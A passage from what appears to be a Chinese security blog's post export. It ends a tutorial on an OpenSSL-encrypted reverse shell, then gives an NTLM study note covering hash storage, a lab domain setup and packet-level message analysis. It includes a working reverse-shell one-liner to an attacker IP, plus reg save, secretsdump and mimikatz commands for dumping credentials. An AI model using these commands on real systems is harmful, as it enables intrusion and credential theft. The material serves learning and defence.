是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。\n\nSSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。\n\n在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n\n反弹 shell 实操实验环境：Linux\n目标机：\n\n系统：Linux\nIP：192.168.1.8\n\n攻击机：\n\n系统：Linux\nIP：47.xxx.xxx.72\n\n假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 2333\n\n\n\n此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。\n这时在目标机进行反弹 shell 操作，命令为：\nmkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2>&amp;1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 > /tmp/s; rm /tmp/s\n\n\n\n这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。\n","categories":["web安全"],"tags":["web安全"]},{"title":"域渗透之 NTLM 学习","url":"/2023/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B-NTLM-%E5%AD%A6%E4%B9%A0/","content":"总算是要开始内网学习了，也是拖了很久了吧\n\n\n0x01 前言总算是要开始内网学习了，也是拖了很久了吧\n\n刚开始学习内网不免会涉及到很多概念性的东西，这些东西我会用我自己的理解方式帮师傅们认识一遍。\n\n0x02 NTLM\n很多文章都没有特别说清楚关于 NTLM 的这一些基础东西，我这里再重新书写一下\n\nNTLM 是什么\n用一句话概括一下 NTLM 是什么\n\nNTLM 是一种认证协议，它使用挑战&#x2F;响应（challenge&#x2F;response）协议来交换消息，并通过加密的密码 hash 来验证用户身份。它在 Windows NT 和 Windows 2000 Server（或更高版本）的工作组环境中使用。\n\nNTLM 中的挑战&#x2F;响应（challenge&#x2F;response）协议是什么意思呢，我们可以用这一个例子来说明一下\n\n1、客户端向服务器发送一个包含明文登录用户名的请求（Type 1 message）2、服务器生成一个 16 位的随机数（Challenge），明文发送回客户端（Type 2 message）3、客户端使用自己的密码哈希对 Challenge 进行加密，生成一个响应（Response），并发送给服务器（Type 3 message）4、服务器验证客户端发送的 Response 是否正确，如果正确则认证成功，否则认证失败\n第二步生成的随机数是用来防止重放攻击的，挑战&#x2F;响应（challenge&#x2F;response）协议也同样防止了重放攻击。\nNTLM 本地认证流程在 Windows 登录界面当中，实际上电脑调用了 winlogon.exe 这个程序，winlogon.exe 即 Windows Logon Process，是 Windows NT 用户登陆程序，用于管理用户登录和退出。\n1、当用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登陆界面2、当 winlogon.exe 接收到账号密码输入之后，会将密码交给 lsass 进程，LSASS 进程用于微软 Windows 系统的安全机制。它用于本地安全和登陆策略。3、将明文密码加密成 NTLM Hash4、与 SAM 数据库比较认证\n这一个认证过程实际上是将用户的输入进行某种加密算法，最后得到一个 hash 值，这个 hash 值会与电脑上的 hash 值相比较。所以我们电脑上存储的都是 hash 值，因为这样就算电脑被攻击，攻击者得到的也是 hash 值，难以进行复原。\n获取存储的 hash作为攻击者的角度，我们需要了解 hash 存放的地址，本机用户的密码文件自然是存放在 SAM 文件中。\n文件位置在：%SystemRoot%\\system32\\config\\SAM\n\n\n在注册表中的存储位置为 hklm\\sam\\sam\\domains\\account\\users\\ 下(必须使用 SYSTEM 权限才能看到)\n\n\n我这里无法获取到 SYSTEM 权限，并且实际情况当中获取 SYSTEM 权限的难度比较大，所以我们可以通过到处注册表的方式来获取 sam、system 数据库的备份\nreg save hklm\\sam sam.save\nreg save hklm\\system system.save\nreg save hklm\\security security.save\n\n\n\n我们可以使用 impacket-secretdump.py 脚本来导出密码存储哈希(当然也可以直接使用 mimikatz 或 LaZagne 等工具)\n用 impacket 读命令如下，注意这个 py 文件被调用需要是在 impacket/examples 下，另外一个文件夹里面的脚本跑不通；并且在运行之前需要将 system.save 等这一类文件放到同目录下。\npython3 secretsdump.py -system system.save -sam sam.save -security security.save LOCAL\n\n\n\n这里我们可以发现存储用户的密码的格式为: uid:rid:lmhash:nthash，关于 lmhash 和 nthash 会在后面进行详细介绍\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\nUID 即 Windows 的登录用户名，这个很好理解。RID 则是 SID 的一部分，500-999 为保留，一般是 Windows 内置的，标准用户 RID 从 1000 开始。\n用 Mimikatz 读使用注意事项：\n\n需要管理员权限\n当机器安装了KB2871997补丁或者系统版本大于 windows server 2012 时，系统的内存中就不再保存明文的密码，这样利用 mimikatz 就不能从内存中读出明文密码了。\n\n爆密码的命令如下\nmimikatz.exe \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords\"\"\n\n\n\n其中 NTLM 值与后文用到的 python 脚本运行生成的值一样\nLM HashLM Hash 全称 LAN Manager Hash 是 Windows 使用的最古老的密码存储，其历史可追溯到 1980 年代的 OS &#x2F; 2；LM Hash 将密码分成两个 7 个字符的部分，然后对每个部分进行散列，得到一个 16 字节的哈希值。LM Hash 的安全性很低，因为它不区分大小写，也不使用盐值或迭代。\n由于 LM Hash 存在的问题微软在 1993 年引入了 NT Hash。在 Windows 2000 版本至 2003 的版本系统默认使用 LM Hash，当密码超过 14 位时，则使用 NT Hash 进行存储。而在 Windows Visita 后，默认情况下只存储 NT Hash，LM Hash 则不再使用。如果用户密码为空或者不存储 LM Hash 的话，我们抓到的 LM Hash 是 AAD3B435B51404EEAAD3B435B51404EE\n\n这里我们可以回顾一下之前通过 impacket 抓包解析的 hash 内容，LM Hash 为 aad3b435b51404eeaad3b435b51404ee，这并没有价值。\n\n部分工具的参数需要填写固定格式 LM hash:NT hash，可以将 LM hash 填0 (LM hash 可以为任意值)，即00000000000000000000000000000000:NT hash\n\n相关策略配置: 本地组策略→本地策略→安全选项→网络安全（不同 Windows 版本可能有一些差异）\n\n在下一次更改密码时不存储 LAN 管理器哈希值\n\n\n注册表位置: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\NoLmHash\n\n\nNTLM HashVista 之后 Windows 系统使用的 Hash，它的前身是 LM Hash，两者相差不大，只是使用的加密算法不同。在 Visita 系统后默认使用。\nNTLM Hash 加密方法1、将用户输入的密码转换成十六进制。假设用户密码为 root，则转换后为 726f6f742、将其转换为 unicode 格式即为：277c740c8fdae5dd75e47312b56af8663、使用 md4 加密值为329153f560eb329c0e1deea55e88a1e9\nimport binascii  \nimport hashlib  \n  \npassword = input(\"Your Password:\")  \nprint(\"Your password is : \" + password)  \nhash = hashlib.new('md4' , password.encode(\"utf-16le\")).digest()  \nhash_hex = binascii.hexlify(hash)  \nprint(\"NTLM answer is : \" + str(hash_hex, 'UTF-8'))\n\n\n\nNet-NTLM hashNet-NTLM Hash 通常是指在网络环境中在 NTLM 认证过程 Type3（响应阶段）中的 Response（NTProofStr）、Blob 和 Type2 阶段（质询阶段）的 ServerChallenge、用户名、请求的域名拼接而成的值。  \n格式为（Net-NTLM v2）：\nusername::domain:server challenge:response(HMAC-MD5):blob\n\n但 Response 通常有以下几种类型:\n\nLM Response， 早期使用的响应类型\nLMv2 Response，在启用 NTLM v2 系统上将替换 LM 响应。\nNTLM v1 Response，基于 Windows NT 客户端，如 Windows 2000 、XP。\nNTLM v2 Response，Windows NT Service Pack 4 引入的响应类型，在 NTLMv2 启用的系统上将替换 NTLM 响应。\nNTLM2 Session Response， 用于在没有 NTLMv2 身份验证的情况下协商 NTLM2 会话安全性时，此方案会更改 LM NTLM 响应的语义。\nAnonymous Response，当匿名上下文正在建立时使用; 没有提供实际的证书，也没有真正的身份验证。“存根”字段显示在类型 3 消息中。\n\n这些响应可以在本地安全策略→本地策略→安全选项→网络安全：LAN 管理器身份验证级别中配置。\n\n\n注册表位置为：HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel\n\n\n\n\n\n\nValue\nOptions\nDescription\n\n\n\n0\n发送 LM NTLM 响应\n客户端使用 LM 和 NTLM 身份验证，而决不会使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。\n\n\n1\n发送 LM 和 NTLM - 如果已协商，则使用 NTLMv2 会话安全\n客户端使用 LM 和 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。\n\n\n2\n仅发送 NTLM 响应\n客户端只使用 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。\n\n\n3\n仅发送 NTLMv2 响应\n客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。\n\n\n4\n仅发送 NTLMv2 响应/拒绝 LM\n客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM，而只接受 NTLM 和 NTLMv2 身份验证。\n\n\n5\n仅发送 NTLMv2 响应/拒绝 LM 和 NTLM\n客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM 和 NTLM，而只接受 NTLMv2 身份验证。\n\n\n\n各系统的默认值为：\n\nWindows 2000 以及 Windows XP: 发送 LM &amp; NTLM 响应\nWindows Server 2003: 仅发送 NTLM 响应\nWindows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2 及以上: 仅发送 NTLMv2 响应\n\n0x03 NTLM 身份认证流量分析环境搭建最开始环境搭建的时候看其他师傅文章很不准确，导致踩坑踩了很久。。。\n需要的虚拟机是 Win2012 以及一台 Win7\n首先两台虚拟机都需要桥接，然后配置 IP，因为 Win2012 是域服务器，所以需要让 Win7 指向&#x2F;归于 Win2012。\n\n\n设置 IP 需要是和物理机处于同一网段下，这里之前被坑死了。\nWin2012 （DC 域控）配置如下\nIP：192.168.5.157子网掩码：255.255.255.0默认网关：192.168.5.1\n首选 DNS：192.168.5.157备用 DNS：8.8.8.8\n\n\nWin7 （域内普通主机）配置如下\nIP：192.168.5.158子网掩码：255.255.255.0默认网关：192.168.5.1\n首选 DNS：192.168.5.157备用 DNS：8.8.8.8\n\n\n至此，用 Win7 是可以 ping 通 Win2012 的\n\n\nwin2012 域环境配置配置完毕 IP 之后，在 win2012 的机器上添加 Windows 功能\n\nActive Directory 域服务\nDNS 服务器\n\n\n\n安装完成后可以在左侧找到 AD DS 服务\n\n\n接着下一步，安装，然后点 AD DS 这里，有一个 “将此服务器提升为域控制器”\n\n\n添加新林：\n将根域名设置为 drunkbaby.com\n\n\n再自行设置域的还原密码，我这里是 root123!\n\n\n之后一路保持默认即可，安装完毕后，系统会自动重启。接下来创建 AD 用户，打开服务器面板的工具——Active Directory 用户和计算机\n\n\n选择 User 右键新建用户\n\n\n\n\n输入密码后创建即可\n至此，win2012 的域控配置已经完成，密码为 root123123!，同户名为 User\nwin7 域环境配置配置完 IP 之后，进入到我的电脑&#x2F;系统属性的地方，进入计算机名&#x2F;域更改\n\n\n输入之前的账号密码，即可。\n\n\n重启后，配置生效。\n可以看到这个时候 win7 已经加入了 drunkbaby.com 的域中\n\n\nNTLM 流量分析在 Win7 当中输入命令如下\nnet use \\\\192.168.5.157\\ipc$ root123123! /user:User\n\n在 atsud0 师傅的文章中说了如下一个场景，我觉得很好，就直接拿来用了 https://atsud0.me/2022/03/07/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E8%AE%A4%E8%AF%81%E5%8E%9F%E7%90%86\n来假设一个场景\n有这么一个人，她叫”纯酱、”。她是某公司财务部的人员。某一天早晨，她登录了自己的办公电脑，正打算开始今天的工作。突然收到一封邮件。\n\nDear ….\n由于近期xxx原因，微软官方于x年x月x日针对xxx发布了修复补丁。内部定义危险级别为严重，请各位员工立刻使用自己的内部帐号登录文件共享服务器10.1.1.5获取补丁进行更新。\n信息技术部\n\n“纯酱、”同事作为遵守公司规则制度的好员工，那肯定立刻就登录上文件共享服务器获取补丁了啊。然后”纯酱、”输入了自己的帐号密码登录 10.1.1.5 了。\n那么这里的认证流程及本是这样工作的。\n\n\n搞了很久，最后在 Win7 机子上装了 Wireshark，版本是  wireshark-2-0-4-32-bit\n1、纯酱用户登录客户端电脑\n2、在客户端上请求服务端服务，并输入服务器要求的帐号密码。本地将会计算并缓存输入的密码的NTLM Hash。\n3、Type1阶段协商 客户端向服务器发送Type1消息，主要包含客户端支持和向服务器端请求的功能列表。（并不会发送明文用户名）\n4、Type2阶段质询 服务器收到客户端Type1消息的请求，作为回应会发送Type2消息请求给客户端，主要包含Server Challenge和服务器的功能信息。（Challenge是随机生成的16位字符串）\n5、Type3阶段身份验证 客户端收到服务器Type2消息后，将会从Type2消息里面提 Server Challenge，用输入的密码NTLM-hash和Server Challenge进行加密运算（根据Flags设置 加密方式亦有所不同），得到Response。然后客户端将会把Type3消息发送给服务器。\n6、服务器收到Type3消息后。将根据用户名来做进一步判断，如果是本地用户的话，会在SAM数据库里面拿这个用户的NTLM Hash，在客户端发送的Response字段提取相关的字段，进行和客户端几乎一样的加密运算，得出一个Response，服务器将会拿这个Response和Type3消息 客户端生成的Response进行对比，如果一致就验证通过。如果是域用户的话，服务器将会通过netlogon协议建立安全通道，将ServerChallenge、UserName、Response消息转发给域控。域控再去ntds.dit判断用户存不存在，然后DC将进行验证工作并把返回结果给服务器，服务器再根据DC的响应返回给客户端。\n所以请求的用户是本地用户还是域用户的区别在于Type3阶段之后服务器的处理方式。\n下面就是介绍三个过程中的部分细节。不感兴趣就可以忽略。\nType 1 协商这个过程主要就是客户端向服务端发送 type1 阶段的消息，以开启 NTLM 认证，并且通过一系列选项来设置身份验证规则，如果需要，它还可以告诉服务器客户端的工作站名称以及拥有的域（绝对不会发送明文用户名）。服务器可以用这些信息来确定客户端是否符合身份验证的条件。\n阶段 1 的包文主要包含以下结构\n\n\n\n\nDescription\nContent\n\n\n\n0\nNTLMSSP Signature\nNull-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)\n\n\n8\nNTLM Message Type\nlong (0x01000000)\n\n\n12\nFlags\nlong\n\n\n(16)\nSupplied Domain (Optional)\nsecurity buffer\n\n\n(24)\nSupplied Workstation (Optional)\nsecurity buffer\n\n\n(32)\nOS Version Structure (Optional)\n8 bytes\n\n\n(32)\nstart of data block (if required)\n\n\n\n\n\n\n目前抓到的流量包是通过 Win7 机子登录得到的流量包，直接用 net use 命令是抓不到的\n\n\n奇怪的是，我和 atsud0 师傅抓到的流量包并不是很相似，atsud0 师傅抓到了一个 NTLMSSP 的包，但是我这里没有抓到，可能是因为我抓的是 Win7 的登录包，是域中服务器的包，而 atsud0 师傅抓的是 Win2012  的包，然而最后抓了 Win2012 的包还是没成功，也可能是我环境的配置有问题，就先借用 atsud0 师傅的截图来分析了\n\n\n抓包信息如下：\n\n\nSignature (8 bytes): 8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\\0’)\nMessageType (4 bytes): 表示消息类型，值必须为 0x0000001\nNegotiate Flags : NEGOTIATE结构体，相关的配置选项。结构体内的每个字段详细的含义都可以在https://docs.microsoft.com/zh-cn/openspecs/windows_protocols&#x2F;ms-nlmp&#x2F;99d90ff4-957f-4c8a-80e4-5bfe5a9a9832和http://davenport.sourceforge.net/ntlm.html#theNtlmFlags了解。\nVersion字段取决于Negotiate Flags结构中的Negotiate Version的值。如果该值为0，则不会显示Version字段，并且该字段是否存在都不影响NTLM消息的处理。\n\n\n如果该值为 1，Version 字段也会在包文中出现，并且内容基本上是为 winver.exe 的内容。\nVersion 字段结构\n\n\n\n\nDescription\nContent\n\n\n\n0\nMajor Version Number\n1 byte\n\n\n1\nMinor Version Number\n1 byte\n\n\n2\nBuild Number\nshort\n\n\n4\nNTLMRevisionCurrent\n0x0000000f\n\n\n\n\n\n\n\n还有其他的字段解释：NEGOTIATE_MESSAGE\n下面是一个十六进制Type1阶段的消息（关于Flag的值可以看这里：http://davenport.sourceforge.net/ntlm.html#theNtlmFlags）：\n例子：\n4e544c4d5353500001000000050288a000000000000000000000000000000000\n\n0x4e544c4d53535000 NTLMSSP签名（固定格式）\n0x01000000 消息类型，这里是阶段1的消息类型\n0x050288a0 &#x3D; 0xa0880205（以小端（低位在前）的字节排序）\n\n05&#x3D;Negotiate Unicode（0x00000001） + Request Target\n（0x00000004）\n02&#x3D;Negotiate NTLM（0x00000200）\n88&#x3D;Negotiate NTLM2 Key(NEGOTIATE_EXTENDED_SESSIONSECURITY 0x00080000) + Negotiate Target Info（0x00800000）\na0&#x3D;Negotiate 56（0x80000000） + Negotiate 128（0x20000000）\n\nFlags的值中，没有表示设置了Negotiate Domain Supplied、Negotiate Workstation Supplied以及Version的值，所以后面没有SecurityBuffer、Version等字段\n\n\nType 2 质询Type2 消息由服务器发送给客户端，响应Type1消息，主要包含服务器生成的Challenge，并且包含Type1消息协商时的相关信息。\n阶段2的包文主要包含以下结构\n\n\n\n\nDescription\nContent\n\n\n\n0\nNTLMSSP Signature\nNull-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)\n\n\n8\nNTLM Message Type\nlong (0x02000000)\n\n\n12\nTarget Name\nsecurity buffer\n\n\n20\nFlags\nlong\n\n\n24\nChallenge\n8 bytes\n\n\n(32)\nContext (Optional)\n8 bytes (two consecutive longs)\n\n\n(40)\nTarget Information (Optional)\nsecurity buffer\n\n\n(48)\nOS Version Structure (Optional)\n8 bytes\n\n\n32 (48) (56)\nstart of data block\n\n\n\n\n\n\nSignature (8 bytes): 8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\\0’)\nMessageType (4 bytes): 表示消息类型，值必须为0x0000002。\nNegotiate Flags(4 bytes) : NEGOTIATE结构体，相关的配置选项。和Type1消息的Negotiate Flags大致相同，不过是表示服务器支持的选项，如果有negotate_message则表示从客户端提供的选项做选择。\nTarget Name 包含身份验证目标的名称，通常是响应客户端在Type1消息中Flags中的Request Target选项。\nServerChallenge(8 bytes):随机生成的16位随机值。\nReserved (8 bytes):发送时必须设为0，接受时必须被忽略。\nTargetInfoFields(8 bytes)：值的内容通常取决于NTLMSSP_NEGOTIATE_TARGET_INFO标志有没有被设置（注：除Windows NT，Windows 2000，Windows XP和Windows Server 2003之外，始终发送TargetInfo字段。）。\n要想理解每个字段的详细信息，还是建议去阅读：CHALLENGE_MESSAGE以及The Type 2 Message。\n例子\n4e544c4d53535000020000000800080038000000050289a2dea8b919645716230000000000000000a200a200400000000601b11d0000000f4400430030003100020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80100000000\n\n0x4e544c4d53535000 NTLMSSP签名\n\n02000000 &#x3D; 00000002 消息类型\n0x0800 &#x3D; 0x0008 TargetNameLen\n\n0x0800 &#x3D; 0x0008 TargetNameMaxLen\n\n0x38000000 &#x3D; 0x00000038  TargetNameBufferOffset\n\n0x050289a2 &#x3D; 0xa2890205  NegotiateFlags\n\n05&#x3D;Negotiate Unicode（0x00000001） + Request Target（0x00000004）\n\n02&#x3D;Negotiate NTLM（0x00000200）\n\n89&#x3D;Negotiate NTLM2 Key(NEGOTIATE_EXTENDED_SESSIONSECURITY 0x00080000) + Negotiate Target Info（0x00800000）+ Target Type Domain （0x00010000）\n\na2&#x3D;Negotiate 56（0x80000000） + Negotiate 128（0x20000000）+ Version（0x02000000）\n\ndea8b91964571623 Server Challenge（随机16位）\n\n0000000000000000 Reserved\n\na200a20040000000 TargetInfoFields\n\na200 &#x3D; 0x00a2  TargetInfoLen\na200 &#x3D;0x00a2 TargetInfoMaxLen\n40000000 &#x3D; 0x00000040 TargetInfoOffset\n\n\n0601b11d0000000f Version\n\n06&#x3D;0x06 Major Version\n01&#x3D;0x01 Minor Version\nb11d&#x3D;0x1db1 Build\n000000  Reseved\n0f &#x3D; 0x0f NTLMRevisionCurrent\n\n\n4400430030003100020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd801\n.....后面接着的payload信息就是TargetName、Targetinfo的信息\n\n00000000 结束字段块\n\n在服务器创建Type2消息后，将会将Type2消息发送给客户端。\nType 3 验证Type3消息是身份验证的最后一步，该步骤是客户端对Type2消息的响应，客户端将使用输入的NTLM-Hash对服务器随机生成的Challenge值进行复杂的加密运算得到Response，将其作为Type3消息发送给服务器。\nResponse是最关键的部分是它向服务器证明了客户端知道用户的帐号密码。服务器收到客户端发送的Type3消息，会判断用户名是本地用户还是域用户名，如果是本地用户将会在SAM中找到这个用户的NTLM-Hash，并从客户端发送的Type3消息中提取相关字段，和客户端进行几乎一样的加密运算，最后得到的Response将会和客户端发送的Response进行比较，如果一致则认证通过。如果是在域用户的话，服务器会通过Netlogon安全通道，将Response、Username、ServerChallenge转发给域控，将验证工作交给去进行，DC将会返回结果给服务器，服务器再根据DC的响应返回给客户端。\n\n\n\n\nDescription\nContent\n\n\n\n0\nNTLMSSP Signature\nNull-terminated ASCII “NTLMSSP” (0x4e544c4d53535000)\n\n\n8\nNTLM Message Type\nlong (0x03000000)\n\n\n12\nLM/LMv2 Response\nsecurity buffer\n\n\n20\nNTLM/NTLMv2 Response\nsecurity buffer\n\n\n28\nTarget Name\nsecurity buffer\n\n\n36\nUser Name\nsecurity buffer\n\n\n44\nWorkstation Name\nsecurity buffer\n\n\n(52)\nSession Key (optional)\nsecurity buffer\n\n\n(60)\nFlags(optional)\nsecurity buffer\n\n\n(64)\nOS Version Structure (Optional)\n8 bytes\n\n\n52 (64) (72)\nstart of data block\n\n\n\n\n\n\nSignature (8 bytes): 8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\\0’)\nMessageType (4 bytes): 表示消息类型，值必须为0x0000003。\nThe LM&#x2F;LMv2 and NTLM&#x2F;NTLMv2 responses LM&#x2F;LMv2 NTLM&#x2F;NTLMv2这两个响应是客户端收到Type2消息用用户输入的密码hash对Challege生成的。\nLmChallengeResponseFields(8 bytes)，包含LmChallengeResponseLen(2 bytes)、LmChallengeResponseMaxLen(2 bytes)、LmChallengeResponseBufferOffset(4 bytes)字段。如果客户端不发送LmChallengeResponse，Len字段则为0。NtChallengeResponseFields (8 bytes)，包含NTChallengeResponseLen(2 bytes)、NTChallengeResponseMaxLen(2 bytes)、NTChallengeResponseBufferOffset(4 bytes)字段。如果客户端不发送NTChallengeResponse，Len字段则为0。\nDomainNameFields (8 bytes)，包含DomainNameLen(2 bytes)、DomainNameMaxLen(2 bytes)、DomainNameBufferOffset(4 bytes)字段。如果客户端不发送DomainName，Len字段应为0。\nUserNameFields (8 bytes),，包含UserNameLen(2 bytes)、UserNameMaxLen(2 bytes)、UserNameBufferOffset(4 bytes)字段。如果客户端不发送UserName，Len字段应为0。\nNegotiateFlags (4 bytes):这里表示的是客户端协商的配置。\n这里细说下 NTChallengeResponse，NTChallengeResponse的结构为\n\n\n\n\nDescription\nContent\n\n\n\n\nResponse（ntlmssp.ntlmv2_response.ntproofstr）16bytes\n\n\n\n\nNTLMv2_CLIENT_CHALLENGE\n\n\n\n\n而NTLMv2_CLIENT_CHALLENGE（Blob）的结构是这样的\n\n\n\n\nDescription\nContent\n\n\n\n0\nBlob Signature\n0x01010000\n\n\n4\nReserved\nlong (0x00000000)\n\n\n8\nTimestamp\n表示自1月1日1601年1月1日以來微秒的十分之一\n\n\n16\nClient Nonce（NTLMv2 Client Challenge）\n8 bytes（随机生成）\n\n\n24\nUnknown\n4 bytes（0x00000000）\n\n\n28\nTarget Information\n从type2阶段来的目标信息块\n\n\n\nUnknown\n4bytes\n\n\n\n想了解每个字段的含义还是得去看官方文档AUTHENTICATE_MESSAGE\n例子:4e544c4d5353500003000000180018005a000000f000f0007200000000000000400000001a001a0040000000000000005a0000000000000062010000050288a0410064006d0069006e006900730074007200610074006f0072001a8e5080fb4a6f0a8bf3e0669eb146f37a735845757168659a792665c56f71be45ecbe9c7d7a99b0010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000\n\n4e544c4d53535000 NTLMSSP Signature\n\n03000000 NTLM Message Type\n\n180018005a000000  LM&#x2F;LMv2 Respons\n1800 &#x3D; 0x0018 &#x3D; 24 Len &amp; MaxLen\n5a000000 &#x3D; 0x0000005a &#x3D; 90 Offset LM&#x2F;LMv2 Respons出现的位置是第90个字节的时候，长度为24。\n\nf000f00072000000 NTLM&#x2F;NTLMv2 Response\nf000&#x3D;0x00f0 &#x3D; 240 Len &amp; MaxLen\n72000000 &#x3D; 0x00000072 &#x3D; 114 Offset NTLM&#x2F;NTLMv2 Respons出现的位置是第240个字节的时候，Offset为114。\n\n0000000040000000 Domain Name\n0000&#x3D;0x0000 Len为0 ，DomainName为空\n40000000 &#x3D; 0x00000040 Offset\n\n1a001a0040000000 UserName\n1a00 &#x3D; 0x001a  &#x3D;26 Len &amp; MaxLen\n40000000 &#x3D;0x00000040 offset username 长度26\n\n000000005a000000 HostName\n0000&#x3D;0x0000 Len为0 ，空\n5a000000 &#x3D; 0x0000005a &#x3D; 90 Offset\n\n0000000062010000 SessionsKeys\n0000&#x3D;0x0000 Len为0 ，空\n62010000 &#x3D; 0x00000162 offset\n\n050288a0 Flags 和Type1的相同\n\n\n410064006d0069006e006900730074007200610074006f007200 Offset:64 长度26 A d m i n i s t r a t o r因为是unicode，所以长度是2倍\n\n\n\n1a8e5080fb4a6f0a8bf3e0669eb146f37a73584575716865 Offset:90 长度24 LM&#x2F;LMv2 Respons\n\n\n9a792665c56f71be45ecbe9c7d7a99b0010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000 NTLM&#x2F;NTLMv2Response\n\nResponse 9a792665c56f71be45ecbe9c7d7a99b0\nBlob 010100000000000020b70cb6992bd8017a7358457571686500000000020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f00530045005200560045005200300031000000000000000000\n\nBlob Signature   4bytes : 01010000 &#x3D;0x01010000\nReserved 4 bytes : 00000000 &#x3D; 0x00000000\nTimestamp 8 bytes: 20b70cb6992bd801 &#x3D; 0x20b70cb6992bd801\nclient nonce 8bytes : 7a73584575716865 &#x3D; 0x7a73584575716865\nend subblock: 00000000 &#x3D; 0x00000000\ntarget information: 020008004400430030003100010010005300450052005600450052003000310004001c006100740073007500640030002e006c00610062002e0063006f006d0003002e00530065007200760065007200300031002e006100740073007500640030002e006c00610062002e0063006f006d0005001c006100740073007500640030002e006c00610062002e0063006f006d000700080020b70cb6992bd80109001a0063006900660073002f005300450052005600450052003000310000000000\nenbsubblock: 00000000\n\n\nThe NTLMv2 Response生成这里注意NTLM&#x2F;NTLMv2Response，我们可以发现NTLMv2Response里面前16 Bytes是一段HMAC-MD5生成的值。被称为Response，或者是NTProofStr。这一段值的生成方式比较复杂，受客户端和服务端Flags（参数）的影响。\n简单的介绍下最基础的生成方式(根据Flags的设置 加密方式会有所不同（比如如果是NTLMv2SessionResponse计算方式就会和下面的不一样）\n\n将明文密码转换为NTLM-Hash(前面有介绍NTLM Hash生成方式)\n将用户名转换为大写,然后和域名(域名区分大小写,但是必须和Type3包文中显示的域名一致)拼接在一起,然后进行Unicode的十六进制编码转换.(这里编码始终使用Unicode即使Flags中设置了OEM).NTLM Hash作为Key 对其进行Hmac Md5加密:HMAC_MD5(((UserName).Upper()+domainName),NTLM Hash)得到ntlmV2Hash\nServerChallenge和Blob进行拼接.使用第三步得到的ntlmV2hash对其进行加密:HMAC_MD5((ServerChallenge+Blob),ntlmv2hash)得到Response(NTProofStr)\n将Response(NTProofStr)和Blob重新进行拼接 得到NTLMv2 Response.\n\nExamples(案例来自:TheNTLMv2Response):\nTarget:DOMAIN\nUsername:user\nPassword:SecREt01\nServerChallenge:0x123456789abcdef\nTargetInformation:0x02000c0044004f004d00410049004e0001000c005300450052005600450052000400140064006f006d00610069006e002e0063006f006d00030022007300650072007600650072002e0064006f006d00610069006e002e0063006f006d0000000000\nTimestamp:0x0090d336b734c301\nClient 